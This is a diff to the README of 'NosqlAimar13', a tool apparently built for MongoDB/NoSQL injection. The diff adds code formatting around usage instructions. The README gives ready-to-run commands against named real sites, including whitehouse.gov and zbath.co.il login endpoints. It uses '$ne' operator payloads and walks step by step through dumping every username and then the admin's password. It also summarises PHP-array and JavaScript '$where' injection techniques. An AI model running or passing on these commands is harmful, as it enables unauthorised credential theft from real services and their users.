@@ -6,14 +6,17 @@ It is not created to download big databases is created to extract usernames and 
 
 
 # Installation
-
+```bash
 pip install requests
 pip install colorama
-
+```
 
 # Usage
-
+```bash
 python3 NosqlAimar13.py 
+```
+
+```
 
 8 8888         8 8888      88 8 8888          8888888888',8888'    d888888o.   8 8888888888       ,o888888o.    
 8 8888         8 8888      88 8 8888                 ,8',8888'   .`8888:' `88. 8 8888            8888     `88.  
@@ -66,21 +69,25 @@ python NosqlAimar13.py -u http://whitehouse.gov --method post --data search=1 --
 python NosqlAimar13.py -u https://www.zbath.co.il:20001/v1/account/login --method json --data {\"username\":\"admin\",\"password\":\"1\"}
 python NosqlAimar13.py -u https://www.zbath.co.il:20001/v1/account/login --method json --data {\"username\":{\"$ne\":\"1\"},\"password\":\"1\"}
 python NosqlAimar13.py -u https://www.zbath.co.il/wp-json/wp/v2/comments?post=1407 --method json --file params.txt
-
+```
 Let's say you have a username and a password, and you want to extract both usernames and passwords.
 # Get the usernames:
+```bash
 python NosqlAimar13.py -u https://www.zbath.co.il/api/login --method json --data {\"username\":\"1\",\"password\":{\"$ne\":\"1\"}} -p username
+```
 This should force NosqlAimar13 to dump out all usernames it can extract.
 
 # Find the password for each username: 
+```bash
 python NosqlAimar13.py -u https://www.zbath.co.il/api/login --method json --data {\"username\":\"admin\",\"password\":\"1\"} -p password
-
+```
 Let's say one of the dumped usernames from Step 1 is "admin". Set that as the username, then force the vulnerable parameter to be password.
 NosqlAimar13 will attempt to dump the password of admin. 
 
 # Check the full description of each technique I've written to perform MongoDB Injection with this command:
+```bash
 python NosqlAimar13.py -h -t aw
-
+```
 It contains most of my documentation for those techniques. However, the basic payloads involved are:
 Parsing in PHP arrays (Instead of username=a, it sends username[$ne]=a, so poorly sanitised MongoDB backends will have a different request)
 Injecting WHERE requests by parsing javascript with single or double quote escapes. There's a payload for a simple where check, as well as injecting into Javascript functions.
